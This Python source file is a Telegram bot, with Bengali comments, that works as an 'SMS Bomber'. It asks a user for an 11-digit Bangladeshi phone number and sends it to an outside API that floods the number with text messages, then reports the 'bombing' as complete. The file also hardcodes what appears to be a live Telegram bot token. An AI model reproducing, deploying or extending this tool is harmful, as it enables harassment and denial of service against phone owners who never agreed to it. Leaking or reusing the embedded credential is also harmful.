import telebot
from telebot import types
import requests
from keep_alive import keep_alive


bot = telebot.TeleBot('7237381740:AAGoGZZKQjYUkHBJWd56Xb0fAxJExylP5f0') # বট টোকেন দিবেন 😐
user_states = {}



@bot.message_handler(commands=['start'])
def send_welcome(message):
    full_name = f"{message.from_user.first_name} {message.from_user.last_name or ''}"
    keyboard = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    bomb = types.KeyboardButton("BOMB💣")
    keyboard.add(bomb)
    bot.reply_to(message, f"Welcome, {full_name}! \n Simple SMS Bomber Bot By : @team_dccs \nChoose an option from below ", reply_markup=keyboard)

@bot.message_handler(func=lambda message: True)
def msg_all(message):
    chat_id = message.chat.id
    user_data = user_states.get(chat_id, None)

    if message.text == "BOMB💣":
        bot.reply_to(message, "Enter your number \nWithout (+88) ")
        user_states[chat_id] = {"state": "waiting_for_input", "data": {"number": None, "amount": None}}
        bot.register_next_step_handler(message, process_input)
    elif user_data and user_data["state"] == "waiting_for_input":
        process_input(message)

def process_input(message):
    chat_id = message.chat.id
    user_data = user_states.get(chat_id, None)
    if user_data and user_data["state"] == "waiting_for_input":
        if user_data["data"]["number"] is None:
            number = message.text
            if number.isdigit() and len(number) == 11: # এখানে বটকে বলা আছে যদি ১১ সংখ্যার নাম্বার হয় তাহলেই শুধু Amount চাও
                user_data["data"]["number"] = number
                bot.send_message(chat_id, "Enter the amount")
            else: # যদি ১১ সংখ্যা না হয়
                bot.send_message(chat_id, "Number Isn't Valid ") # নিজের মতো মেসেজ লিখুন কি দিতে চান যদি ১১ সংখ্যা না হয়
        else: # সব ঠিক থাকলে
            amount = message.text
            number = user_data["data"]["number"]
            bot.send_message(chat_id, f"Please wait bombing started the number \n +88{number}")
            # ডিরেক্ট এপিআই দিবেন শুধু
            api=f"https://api.teamdccs.xyz/sms.php?number={number}"
            response= requests.get(api).text
            bot.send_message(chat_id, f"bombing successfully complete to the number +88{number}")
            user_states.pop(chat_id, None)
    else:
        bot.send_message(chat_id, "Unknown Bug. Please try again.")

if __name__ == "__main__":
    keep_alive()
    bot.polling()
